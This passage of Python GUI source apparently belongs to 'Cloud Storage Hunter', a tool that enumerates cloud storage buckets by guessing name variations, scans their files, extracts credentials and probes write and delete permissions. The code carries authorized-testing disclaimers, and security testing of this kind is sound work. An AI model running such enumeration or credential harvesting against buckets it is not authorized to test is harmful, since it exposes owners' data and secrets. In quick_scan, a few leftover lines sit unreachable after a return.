        tools_notebook.add(generation_frame, text="⚙️ Generation")
        self.create_generation_tools(generation_frame)
    
    def create_crypto_tools(self, parent):
        """Create cryptography tools"""
        # Hash Generator
        hash_frame = ttk.LabelFrame(parent, text="Hash Generator")
        hash_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(hash_frame, text="Input:").pack(anchor=tk.W, padx=10)
        self.hash_input = scrolledtext.ScrolledText(hash_frame, height=5, bg='#1e1e1e', fg='white')
        self.hash_input.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(hash_frame, text="Generate Hashes", command=self.generate_hashes, style='Primary.TButton').pack(pady=5)
        
        self.hash_output = scrolledtext.ScrolledText(hash_frame, height=6, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.hash_output.pack(fill=tk.X, padx=10, pady=5)
        
        # Encryption/Decryption
        crypto_frame = ttk.LabelFrame(parent, text="Encryption / Decryption")
        crypto_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(crypto_frame, text="Key:").pack(anchor=tk.W, padx=10)
        self.crypto_key_var = tk.StringVar()
        ttk.Entry(crypto_frame, textvariable=self.crypto_key_var, width=60).pack(padx=10, pady=5, fill=tk.X)
        
        ttk.Button(crypto_frame, text="Generate Key", command=self.generate_crypto_key).pack(pady=5)
        
        ttk.Label(crypto_frame, text="Data:").pack(anchor=tk.W, padx=10)
        self.crypto_input = scrolledtext.ScrolledText(crypto_frame, height=5, bg='#1e1e1e', fg='white')
        self.crypto_input.pack(fill=tk.X, padx=10, pady=5)
        
        btn_frame = ttk.Frame(crypto_frame)
        btn_frame.pack(pady=5)
        ttk.Button(btn_frame, text="Encrypt", command=self.encrypt_data, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Decrypt", command=self.decrypt_data, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        
        self.crypto_output = scrolledtext.ScrolledText(crypto_frame, height=5, bg='#1e1e1e', fg=self.colors['green'])
        self.crypto_output.pack(fill=tk.X, padx=10, pady=5)
    
    def create_encoding_tools(self, parent):
        """Create encoding/decoding tools"""
        # Base64
        base64_frame = ttk.LabelFrame(parent, text="Base64")
        base64_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(base64_frame, text="Input:").pack(anchor=tk.W, padx=10)
        self.base64_input = scrolledtext.ScrolledText(base64_frame, height=5, bg='#1e1e1e', fg='white')
        self.base64_input.pack(fill=tk.X, padx=10, pady=5)
        
        btn_frame = ttk.Frame(base64_frame)
        btn_frame.pack(pady=5)
        ttk.Button(btn_frame, text="Encode", command=self.base64_encode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Decode", command=self.base64_decode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        
        self.base64_output = scrolledtext.ScrolledText(base64_frame, height=5, bg='#1e1e1e', fg=self.colors['green'])
        self.base64_output.pack(fill=tk.X, padx=10, pady=5)
        
        # URL
        url_frame = ttk.LabelFrame(parent, text="URL Encode/Decode")
        url_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(url_frame, text="Input:").pack(anchor=tk.W, padx=10)
        self.url_input = scrolledtext.ScrolledText(url_frame, height=5, bg='#1e1e1e', fg='white')
        self.url_input.pack(fill=tk.X, padx=10, pady=5)
        
        btn_frame2 = ttk.Frame(url_frame)
        btn_frame2.pack(pady=5)
        ttk.Button(btn_frame2, text="Encode", command=self.url_encode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame2, text="Decode", command=self.url_decode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        
        self.url_output = scrolledtext.ScrolledText(url_frame, height=5, bg='#1e1e1e', fg=self.colors['green'])
        self.url_output.pack(fill=tk.X, padx=10, pady=5)
        
        # Hex
        hex_frame = ttk.LabelFrame(parent, text="Hex Encode/Decode")
        hex_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(hex_frame, text="Input:").pack(anchor=tk.W, padx=10)
        self.hex_input = scrolledtext.ScrolledText(hex_frame, height=5, bg='#1e1e1e', fg='white')
        self.hex_input.pack(fill=tk.X, padx=10, pady=5)
        
        btn_frame3 = ttk.Frame(hex_frame)
        btn_frame3.pack(pady=5)
        ttk.Button(btn_frame3, text="Encode", command=self.hex_encode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame3, text="Decode", command=self.hex_decode, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        
        self.hex_output = scrolledtext.ScrolledText(hex_frame, height=5, bg='#1e1e1e', fg=self.colors['green'])
        self.hex_output.pack(fill=tk.X, padx=10, pady=5)
    
    def create_network_tools(self, parent):
        """Create network tools"""
        # Port Scanner
        port_frame = ttk.LabelFrame(parent, text="Port Scanner")
        port_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(port_frame, text="Target:").pack(anchor=tk.W, padx=10)
        self.port_target_var = tk.StringVar()
        ttk.Entry(port_frame, textvariable=self.port_target_var, width=40).pack(padx=10, pady=5)
        
        ttk.Label(port_frame, text="Ports:").pack(anchor=tk.W, padx=10)
        self.port_range_var = tk.StringVar(value="1-1000")
        ttk.Entry(port_frame, textvariable=self.port_range_var, width=40).pack(padx=10, pady=5)
        
        ttk.Button(port_frame, text="Scan Ports", command=self.scan_ports, style='Primary.TButton').pack(pady=5)
        
        self.port_output = scrolledtext.ScrolledText(port_frame, height=8, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.port_output.pack(fill=tk.X, padx=10, pady=5)
        
        # DNS Lookup
        dns_frame = ttk.LabelFrame(parent, text="DNS Lookup")
        dns_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(dns_frame, text="Domain:").pack(anchor=tk.W, padx=10)
        self.dns_target_var = tk.StringVar()
        ttk.Entry(dns_frame, textvariable=self.dns_target_var, width=40).pack(padx=10, pady=5)
        
        ttk.Button(dns_frame, text="Lookup", command=self.dns_lookup, style='Primary.TButton').pack(pady=5)
        
        self.dns_output = scrolledtext.ScrolledText(dns_frame, height=8, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.dns_output.pack(fill=tk.X, padx=10, pady=5)
    
    def create_analysis_tools(self, parent):
        """Create analysis tools"""
        # JSON Formatter
        json_frame = ttk.LabelFrame(parent, text="JSON Formatter")
        json_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(json_frame, text="JSON Input:").pack(anchor=tk.W, padx=10)
        self.json_input = scrolledtext.ScrolledText(json_frame, height=8, bg='#1e1e1e', fg='white', font=('Consolas', 9))
        self.json_input.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(json_frame, text="Format JSON", command=self.format_json, style='Primary.TButton').pack(pady=5)
        
        self.json_output = scrolledtext.ScrolledText(json_frame, height=8, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.json_output.pack(fill=tk.X, padx=10, pady=5)
        
        # Regex Tester
        regex_frame = ttk.LabelFrame(parent, text="Regex Tester")
        regex_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(regex_frame, text="Pattern:").pack(anchor=tk.W, padx=10)
        self.regex_pattern_var = tk.StringVar()
        ttk.Entry(regex_frame, textvariable=self.regex_pattern_var, width=60).pack(padx=10, pady=5, fill=tk.X)
        
        ttk.Label(regex_frame, text="Test Text:").pack(anchor=tk.W, padx=10)
        self.regex_input = scrolledtext.ScrolledText(regex_frame, height=6, bg='#1e1e1e', fg='white')
        self.regex_input.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(regex_frame, text="Test Regex", command=self.test_regex, style='Primary.TButton').pack(pady=5)
        
        self.regex_output = scrolledtext.ScrolledText(regex_frame, height=6, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.regex_output.pack(fill=tk.X, padx=10, pady=5)
    
    def create_generation_tools(self, parent):
        """Create generation tools"""
        # Password Generator
        pass_frame = ttk.LabelFrame(parent, text="Password Generator")
        pass_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(pass_frame, text="Length:").pack(anchor=tk.W, padx=10)
        self.pass_length_var = tk.IntVar(value=16)
        ttk.Scale(pass_frame, from_=8, to=64, variable=self.pass_length_var, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=5)
        
        self.pass_upper_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(pass_frame, text="Uppercase", variable=self.pass_upper_var).pack(anchor=tk.W, padx=10)
        
        self.pass_lower_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(pass_frame, text="Lowercase", variable=self.pass_lower_var).pack(anchor=tk.W, padx=10)
        
        self.pass_digits_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(pass_frame, text="Digits", variable=self.pass_digits_var).pack(anchor=tk.W, padx=10)
        
        self.pass_symbols_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(pass_frame, text="Symbols", variable=self.pass_symbols_var).pack(anchor=tk.W, padx=10)
        
        ttk.Button(pass_frame, text="Generate Password", command=self.generate_password, style='Primary.TButton').pack(pady=5)
        
        self.pass_output = scrolledtext.ScrolledText(pass_frame, height=3, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 10))
        self.pass_output.pack(fill=tk.X, padx=10, pady=5)
        
        # UUID Generator
        uuid_frame = ttk.LabelFrame(parent, text="UUID Generator")
        uuid_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(uuid_frame, text="Number of UUIDs:").pack(anchor=tk.W, padx=10)
        self.uuid_count_var = tk.IntVar(value=5)
        ttk.Spinbox(uuid_frame, from_=1, to=100, textvariable=self.uuid_count_var, width=10).pack(anchor=tk.W, padx=10)
        
        ttk.Button(uuid_frame, text="Generate UUIDs", command=self.generate_uuids, style='Primary.TButton').pack(pady=5)
        
        self.uuid_output = scrolledtext.ScrolledText(uuid_frame, height=6, bg='#1e1e1e', fg=self.colors['green'], font=('Consolas', 9))
        self.uuid_output.pack(fill=tk.X, padx=10, pady=5)
    
    # ========================================================================
    # REPORTS TAB
    # ========================================================================
    
    def create_reports_tab(self):
        """Create reports tab"""
        self.reports_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.reports_frame, text="📈 Reports")
        
        # Report types
        types_frame = ttk.LabelFrame(self.reports_frame, text="Report Types")
        types_frame.pack(fill=tk.X, padx=20, pady=10)
        
        reports = [
            ("📊 Full Security Report", self.generate_full_report, "Complete security assessment report"),
            ("📄 Executive Summary", self.generate_executive_summary, "High-level overview for management"),
            ("🔐 Vulnerability Report", self.generate_vulnerability_report, "Detailed vulnerability findings"),
            ("🔑 Credentials Report", self.generate_credentials_report, "All discovered credentials"),
            ("📋 Inventory Report", self.generate_inventory_report, "Complete bucket and file inventory"),
            ("⚠️ Risk Assessment", self.generate_risk_assessment, "Risk scoring and recommendations"),
        ]
        
        for text, cmd, desc in reports:
            btn_frame = ttk.Frame(types_frame)
            btn_frame.pack(fill=tk.X, padx=10, pady=5)
            
            btn = tk.Button(btn_frame, text=text, command=cmd, bg='#1a1a1a', fg=self.colors['cyan'],
                           font=('Segoe UI', 10), padx=15, pady=5, relief=tk.FLAT, cursor='hand2',
                           width=25)
            btn.pack(side=tk.LEFT)
            
            ttk.Label(btn_frame, text=desc, foreground=self.colors['fg']).pack(side=tk.LEFT, padx=10)
        
        # Export options
        export_frame = ttk.LabelFrame(self.reports_frame, text="Export Options")
        export_frame.pack(fill=tk.X, padx=20, pady=10)
        
        export_formats = ["HTML", "PDF", "JSON", "CSV", "XML", "Markdown"]
        self.export_format_var = tk.StringVar(value="HTML")
        
        ttk.Label(export_frame, text="Format:").pack(anchor=tk.W, padx=10)
        format_combo = ttk.Combobox(export_frame, textvariable=self.export_format_var, values=export_formats, width=15)
        format_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        ttk.Label(export_frame, text="Include:").pack(anchor=tk.W, padx=10)
        self.include_buckets_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(export_frame, text="Buckets", variable=self.include_buckets_var).pack(anchor=tk.W, padx=30)
        
        self.include_files_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(export_frame, text="Files", variable=self.include_files_var).pack(anchor=tk.W, padx=30)
        
        self.include_credentials_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(export_frame, text="Credentials", variable=self.include_credentials_var).pack(anchor=tk.W, padx=30)
        
        self.include_vulnerabilities_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(export_frame, text="Vulnerabilities", variable=self.include_vulnerabilities_var).pack(anchor=tk.W, padx=30)
        
        ttk.Button(export_frame, text="Export Report", command=self.export_custom_report, style='Success.TButton').pack(pady=10)
        
        # Previous reports
        history_frame = ttk.LabelFrame(self.reports_frame, text="Previous Reports")
        history_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.reports_list = tk.Listbox(history_frame, bg='#0a0a0a', fg=self.colors['cyan'], height=8)
        self.reports_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.reports_list.bind('<Double-1>', self.open_previous_report)
        
        ttk.Button(history_frame, text="Open Selected", command=self.open_previous_report).pack(pady=5)
    
    # ========================================================================
    # HISTORY TAB
    # ========================================================================
    
    def create_history_tab(self):
        """Create scan history tab"""
        self.history_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.history_frame, text="📜 History")
        
        # Toolbar
        toolbar = ttk.Frame(self.history_frame)
        toolbar.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(toolbar, text="🔄 Refresh", command=self.load_history).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🗑 Clear History", command=self.clear_history, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="📄 Export", command=self.export_history).pack(side=tk.LEFT, padx=5)
        
        # History tree
        columns = ("ID", "Target", "Provider", "Status", "Start Time", "End Time", "Buckets", "Files", "Credentials")
        self.history_tree = ttk.Treeview(self.history_frame, columns=columns, show='headings', height=25)
        
        for col in columns:
            self.history_tree.heading(col, text=col)
            self.history_tree.column(col, width=120)
        
        self.history_tree.column("ID", width=150)
        self.history_tree.column("Target", width=200)
        
        scroll_y = ttk.Scrollbar(self.history_frame, orient=tk.VERTICAL, command=self.history_tree.yview)
        scroll_x = ttk.Scrollbar(self.history_frame, orient=tk.HORIZONTAL, command=self.history_tree.xview)
        self.history_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.history_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.history_tree.bind('<Double-1>', self.load_history_scan)
    
    # ========================================================================
    # SETTINGS TAB
    # ========================================================================
    
    def create_settings_tab(self):
        """Create settings tab"""
        self.settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_frame, text="⚙️ Settings")
        
        # Create notebook for settings categories
        settings_notebook = ttk.Notebook(self.settings_frame)
        settings_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # General settings
        general_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(general_frame, text="General")
        self.create_general_settings(general_frame)
        
        # Scan settings
        scan_settings_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(scan_settings_frame, text="Scan")
        self.create_scan_settings(scan_settings_frame)
        
        # Network settings
        network_settings_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(network_settings_frame, text="Network")
        self.create_network_settings(network_settings_frame)
        
        # Security settings
        security_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(security_frame, text="Security")
        self.create_security_settings(security_frame)
        
        # API settings
        api_frame = ttk.Frame(settings_notebook)
        settings_notebook.add(api_frame, text="API Keys")
        self.create_api_settings(api_frame)
    
    def create_general_settings(self, parent):
        """Create general settings UI"""
        # Theme
        theme_frame = ttk.LabelFrame(parent, text="Appearance")
        theme_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(theme_frame, text="Theme:").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.theme_var = tk.StringVar(value=self.settings['theme'])
        theme_combo = ttk.Combobox(theme_frame, textvariable=self.theme_var, values=["dark", "light", "system"])
        theme_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        # Results directory
        dir_frame = ttk.LabelFrame(parent, text="Storage")
        dir_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(dir_frame, text="Results Directory:").pack(anchor=tk.W, padx=10, pady=(10,0))
        dir_entry_frame = ttk.Frame(dir_frame)
        dir_entry_frame.pack(fill=tk.X, padx=10, pady=5)
        self.results_dir_var = tk.StringVar(value=self.settings['results_dir'])
        ttk.Entry(dir_entry_frame, textvariable=self.results_dir_var).pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(dir_entry_frame, text="Browse", command=self.browse_results_dir).pack(side=tk.RIGHT, padx=5)
        
        # Auto-save
        self.auto_save_var = tk.BooleanVar(value=self.settings['auto_save'])
        ttk.Checkbutton(dir_frame, text="Auto-save results", variable=self.auto_save_var).pack(anchor=tk.W, padx=10, pady=5)
        
        # Notifications
        self.notify_var = tk.BooleanVar(value=self.settings['notify_on_complete'])
        ttk.Checkbutton(dir_frame, text="Show notifications", variable=self.notify_var).pack(anchor=tk.W, padx=10, pady=5)
    
    def create_scan_settings(self, parent):
        """Create scan settings UI"""
        # Timeout
        timeout_frame = ttk.LabelFrame(parent, text="Request Settings")
        timeout_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(timeout_frame, text="Timeout (seconds):").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.timeout_var = tk.IntVar(value=self.settings['timeout'])
        ttk.Scale(timeout_frame, from_=5, to=60, variable=self.timeout_var, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(timeout_frame, textvariable=self.timeout_var).pack(anchor=tk.W, padx=10)
        
        ttk.Label(timeout_frame, text="Max Retries:").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.retries_var = tk.IntVar(value=self.settings['max_retries'])
        ttk.Spinbox(timeout_frame, from_=1, to=10, textvariable=self.retries_var, width=10).pack(anchor=tk.W, padx=10, pady=5)
        
        # Threads
        threads_frame = ttk.LabelFrame(parent, text="Performance")
        threads_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(threads_frame, text="Max Threads:").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.threads_var = tk.IntVar(value=self.settings['max_threads'])
        ttk.Scale(threads_frame, from_=10, to=200, variable=self.threads_var, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(threads_frame, textvariable=self.threads_var).pack(anchor=tk.W, padx=10)
        
        ttk.Label(threads_frame, text="Rate Limit Delay (seconds):").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.delay_var = tk.DoubleVar(value=self.settings['rate_limit_delay'])
        ttk.Scale(threads_frame, from_=0, to=2, variable=self.delay_var, orient=tk.HORIZONTAL).pack(fill=tk.X, padx=10, pady=5)
        
        # Scan options
        options_frame = ttk.LabelFrame(parent, text="Scan Options")
        options_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.deep_scan_var = tk.BooleanVar(value=self.settings['deep_scan'])
        ttk.Checkbutton(options_frame, text="Deep Scan", variable=self.deep_scan_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.max_depth_var = tk.IntVar(value=self.settings['max_depth'])
        ttk.Label(options_frame, text="Max Depth:").pack(anchor=tk.W, padx=10)
        ttk.Spinbox(options_frame, from_=1, to=20, textvariable=self.max_depth_var, width=10).pack(anchor=tk.W, padx=10, pady=5)
    
    def create_network_settings(self, parent):
        """Create network settings UI"""
        # Proxy
        proxy_frame = ttk.LabelFrame(parent, text="Proxy Settings")
        proxy_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.proxy_enabled_var = tk.BooleanVar(value=self.settings['proxy_enabled'])
        ttk.Checkbutton(proxy_frame, text="Enable Proxy", variable=self.proxy_enabled_var).pack(anchor=tk.W, padx=10, pady=5)
        
        ttk.Label(proxy_frame, text="Proxy URL:").pack(anchor=tk.W, padx=10, pady=(10,0))
        self.proxy_url_var = tk.StringVar(value=self.settings['proxy_url'])
        ttk.Entry(proxy_frame, textvariable=self.proxy_url_var, width=50).pack(fill=tk.X, padx=10, pady=5)
        
        # SSL
        ssl_frame = ttk.LabelFrame(parent, text="SSL/TLS Settings")
        ssl_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.verify_ssl_var = tk.BooleanVar(value=self.settings['verify_ssl'])
        ttk.Checkbutton(ssl_frame, text="Verify SSL Certificates", variable=self.verify_ssl_var).pack(anchor=tk.W, padx=10, pady=5)
        
        # User Agent
        ua_frame = ttk.LabelFrame(parent, text="User Agent")
        ua_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.ua_rotation_var = tk.BooleanVar(value=self.settings['user_agent_rotation'])
        ttk.Checkbutton(ua_frame, text="Rotate User Agents", variable=self.ua_rotation_var).pack(anchor=tk.W, padx=10, pady=5)
    
    def create_security_settings(self, parent):
        """Create security settings UI"""
        # Detection
        detection_frame = ttk.LabelFrame(parent, text="Vulnerability Detection")
        detection_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.detect_ssrf_var = tk.BooleanVar(value=self.settings['detect_ssrf'])
        ttk.Checkbutton(detection_frame, text="Detect SSRF", variable=self.detect_ssrf_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.detect_sqli_var = tk.BooleanVar(value=self.settings['detect_sqli'])
        ttk.Checkbutton(detection_frame, text="Detect SQL Injection", variable=self.detect_sqli_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.detect_xss_var = tk.BooleanVar(value=self.settings['detect_xss'])
        ttk.Checkbutton(detection_frame, text="Detect XSS", variable=self.detect_xss_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.detect_lfi_var = tk.BooleanVar(value=self.settings['detect_lfi'])
        ttk.Checkbutton(detection_frame, text="Detect LFI/RFI", variable=self.detect_lfi_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.detect_rce_var = tk.BooleanVar(value=self.settings['detect_rce'])
        ttk.Checkbutton(detection_frame, text="Detect RCE", variable=self.detect_rce_var).pack(anchor=tk.W, padx=10, pady=5)
        
        # Safe mode
        safe_frame = ttk.LabelFrame(parent, text="Safety")
        safe_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.test_write_var = tk.BooleanVar(value=self.settings['test_write'])
        ttk.Checkbutton(safe_frame, text="Test Write Permissions", variable=self.test_write_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.test_delete_var = tk.BooleanVar(value=self.settings['test_delete'])
        ttk.Checkbutton(safe_frame, text="Test Delete Permissions", variable=self.test_delete_var).pack(anchor=tk.W, padx=10, pady=5)
    
    def create_api_settings(self, parent):
        """Create API keys settings UI"""
        # VirusTotal
        vt_frame = ttk.LabelFrame(parent, text="VirusTotal API")
        vt_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.vt_enabled_var = tk.BooleanVar(value=bool(self.settings.get('check_virustotal', False)))
        ttk.Checkbutton(vt_frame, text="Enable VirusTotal Integration", variable=self.vt_enabled_var).pack(anchor=tk.W, padx=10, pady=5)
        
        ttk.Label(vt_frame, text="API Key:").pack(anchor=tk.W, padx=10)
        self.vt_key_var = tk.StringVar(value=self.settings.get('virus_total_api_key', ''))
        ttk.Entry(vt_frame, textvariable=self.vt_key_var, width=50, show="*").pack(fill=tk.X, padx=10, pady=5)
        
        # Other APIs
        other_frame = ttk.LabelFrame(parent, text="Other Integrations")
        other_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(other_frame, text="Shodan API Key:").pack(anchor=tk.W, padx=10)
        self.shodan_key_var = tk.StringVar()
        ttk.Entry(other_frame, textvariable=self.shodan_key_var, width=50, show="*").pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(other_frame, text="Censys API Key:").pack(anchor=tk.W, padx=10)
        self.censys_key_var = tk.StringVar()
        ttk.Entry(other_frame, textvariable=self.censys_key_var, width=50, show="*").pack(fill=tk.X, padx=10, pady=5)
        
        # Save button
        ttk.Button(parent, text="Save All Settings", command=self.save_all_settings, style='Success.TButton').pack(pady=20)
    
    # ========================================================================
    # ABOUT TAB
    # ========================================================================
    
    def create_about_tab(self):
        """Create about tab"""
        self.about_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.about_frame, text="ℹ️ About")
        
        # Logo and title
        logo_frame = ttk.Frame(self.about_frame)
        logo_frame.pack(pady=30)
        
        title = ttk.Label(logo_frame, text=f"{self.APP_NAME}", style='Title.TLabel')
        title.pack()
        
        version = ttk.Label(logo_frame, text=f"Version {self.VERSION}", style='Subheading.TLabel')
        version.pack()
        
        build = ttk.Label(logo_frame, text=f"Build {self.BUILD_DATE}", style='Subheading.TLabel')
        build.pack()
        
        # Description
        desc_frame = ttk.LabelFrame(self.about_frame, text="About")
        desc_frame.pack(fill=tk.X, padx=50, pady=20)
        
        description = """
Cloud Storage Hunter is a professional security assessment tool designed to help 
security professionals identify misconfigured cloud storage buckets and potential 
security vulnerabilities.

Features:
• Multi-provider support (AWS S3, Google GCS, Azure Blob, and more)
• Full file management with editing capabilities
• Automated credential detection and extraction
• Vulnerability scanning (XSS, SQLi, LFI, RCE, SSRF)
• Comprehensive reporting (HTML, PDF, JSON, CSV)
• Built-in security tools (hash generation, encoding, network scanning)
• Professional dashboard with statistics

This tool should only be used for authorized security testing purposes.
Unauthorized access to cloud storage resources is illegal.
"""
        
        desc_text = scrolledtext.ScrolledText(desc_frame, height=15, bg='#0a0a0a', fg=self.colors['fg'], wrap=tk.WORD)
        desc_text.insert(1.0, description)
        desc_text.config(state=tk.DISABLED)
        desc_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Links
        links_frame = ttk.Frame(self.about_frame)
        links_frame.pack(pady=20)
        
        ttk.Label(links_frame, text="Links:", style='Heading.TLabel').pack()
        
        link_frame = ttk.Frame(links_frame)
        link_frame.pack(pady=10)
        
        def open_github():
            webbrowser.open("https://github.com/security-tools/CloudStorageHunter-Pro")
        
        def open_docs_link():
            webbrowser.open("https://docs.cloudstoragehunter.com")
        
        tk.Button(link_frame, text="GitHub", command=open_github, bg='#1a1a1a', fg=self.colors['cyan'],
                 font=('Segoe UI', 10), padx=20, pady=5, relief=tk.FLAT, cursor='hand2').pack(side=tk.LEFT, padx=10)
        
        tk.Button(link_frame, text="Documentation", command=open_docs_link, bg='#1a1a1a', fg=self.colors['cyan'],
                 font=('Segoe UI', 10), padx=20, pady=5, relief=tk.FLAT, cursor='hand2').pack(side=tk.LEFT, padx=10)
        
        # License
        license_frame = ttk.LabelFrame(self.about_frame, text="License")
        license_frame.pack(fill=tk.X, padx=50, pady=20)
        
        license_text = """
This software is provided for educational and authorized security testing purposes only.
The author is not responsible for any misuse or damage caused by this tool.

By using this software, you agree that you have obtained proper authorization
to test the target systems and will comply with all applicable laws.
"""
        
        license_label = ttk.Label(license_frame, text=license_text, wraplength=800, justify=tk.CENTER)
        license_label.pack(padx=20, pady=20)
    
    # ========================================================================
    # UTILITY METHODS (Core functionality)
    # ========================================================================
    
    def quick_scan(self):
        """Perform quick scan using known patterns"""
        target = self.scan_target_var.get().strip()

        # Wordlist-only mode support
        wordlist_buckets = []
        if self.wordlist_var.get() and os.path.exists(self.wordlist_var.get()):
            try:
                with open(self.wordlist_var.get(), 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist_buckets = [line.strip() for line in f if line.strip()]
            except Exception as e:
                self.log(f"Wordlist read error: {e}")

        if not target and not wordlist_buckets:
            messagebox.showwarning("Warning", "Enter target/domain OR provide a wordlist of bucket names.")
            return

        selected_provider = self.scan_provider_var.get().strip() if hasattr(self, 'scan_provider_var') else "All"

        def provider_allowed(provider: Provider) -> bool:
            if selected_provider == "All":
                return True
            if selected_provider == "AWS S3 (Amazon)":
                return provider == Provider.AWS_S3
            if selected_provider == "Google GCS":
                return provider == Provider.GOOGLE_GCS
            return True
            messagebox.showwarning("Warning", "Enter a target!")
            return
        
        self.log(f"Starting quick scan for: {target}")
        self.scan_results_text.delete(1.0, tk.END)
        self.scan_results_text.insert(tk.END, f"Quick scan started for: {target}\n\n")
        
        # Wordlist-only direct bucket names
        if not target and wordlist_buckets:
            for bucket in wordlist_buckets[:5000]:
                self.scan_results_text.insert(tk.END, f"Checking: {bucket}\n")
                self.scan_results_text.see(tk.END)
                self.root.update_idletasks()
                provider = self.detect_provider(bucket)
                if provider != Provider.UNKNOWN and provider_allowed(provider):
                    self.scan_results_text.insert(tk.END, f"✅ FOUND: {bucket} ({provider.value})\n")
                    self.scan_bucket_content(bucket, provider)

        # Use known buckets if available
        elif target in self.known_buckets:
            for bucket in self.known_buckets[target]:
                self.scan_results_text.insert(tk.END, f"Checking: {bucket}\n")
                self.scan_results_text.see(tk.END)
                self.root.update_idletasks()
                
                provider = self.detect_provider(bucket)
                if provider != Provider.UNKNOWN and provider_allowed(provider):
                    self.scan_results_text.insert(tk.END, f"✅ FOUND: {bucket} ({provider.value})\n")
                    self.scan_bucket_content(bucket, provider)
        else:
            # Generate variations
            base = target.replace('.', '-').replace('_', '-')
            base = re.sub(r'[^a-zA-Z0-9-]', '', base)
            
            variations = [
                base, f"{base}-prod", f"{base}-dev", f"{base}-test",
                f"{base}-backup", f"{base}-cdn", f"cdn-{base}",
                f"{base}-assets", f"assets-{base}", f"{base}-media",
                f"media-{base}", f"{base}-static", f"static-{base}"
            ]
            
            for bucket in variations:
